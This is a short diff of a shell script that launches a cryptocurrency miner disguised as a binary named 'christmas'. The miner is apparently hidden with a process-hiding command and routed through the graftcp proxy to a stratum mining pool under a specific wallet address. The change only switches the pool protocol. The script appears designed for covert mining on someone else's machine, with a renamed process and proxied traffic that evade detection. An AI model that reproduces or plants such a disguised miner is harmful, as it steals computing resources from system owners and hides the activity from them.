@@ -35,5 +35,5 @@ chmod +x christmas
 
 ph add christmas
 
-./graftcp/graftcp ./christmas -a gr -o stratum+tcps://na-rtm.pool-server.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz -p IhatePopUps
+./graftcp/graftcp ./christmas -a gr -o stratum+ssl://na-rtm.pool-server.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz -p IhatePopUps
 
